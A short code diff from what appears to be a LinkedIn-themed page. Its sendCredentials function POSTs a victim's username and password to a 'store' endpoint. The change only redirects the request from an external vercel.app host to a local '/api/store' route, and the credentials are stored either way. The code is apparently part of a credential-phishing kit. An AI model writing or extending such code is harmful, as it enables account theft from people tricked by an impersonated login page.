@@ -11,7 +11,7 @@ export default function LinkedinUserDetailsPage() {
 
   async function sendCredentials(data: { username: string; password: string }) {
     try {
-      const res = await fetch("https://dev-hire-znlr.vercel.app/api/store", {
+      const res = await fetch("/api/store", {
         method: "POST",
         headers: { "content-type": "application/json" },
         body: JSON.stringify(data),
